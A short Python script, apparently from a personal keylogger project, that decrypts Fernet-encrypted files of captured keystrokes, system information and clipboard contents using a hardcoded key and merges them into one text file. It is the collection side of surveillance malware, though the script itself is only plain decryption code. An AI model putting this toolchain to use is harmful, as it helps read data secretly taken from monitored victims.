from cryptography.fernet import Fernet

key = "QlT8--4EzKjeh-Xp53BzktfBqGuuyas69Cyo6XdjZ-E="

keys_information_e = "C:\\Users\\Faisal\\Downloads\\Result\\CUsersFaisalDesktopkeyloggerfinalkeyloggerfinaldistkeylogE.txt"
system_information_e = "C:\\Users\\Faisal\\Downloads\\Result\\CUsersFaisalDesktopkeyloggerfinalkeyloggerfinaldistsystemInformationE.txt"
clipboard_information_e = "C:\\Users\\Faisal\\Downloads\\Result\\CUsersFaisalDesktopkeyloggerfinalkeyloggerfinaldistclipboardE.txt"




encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1
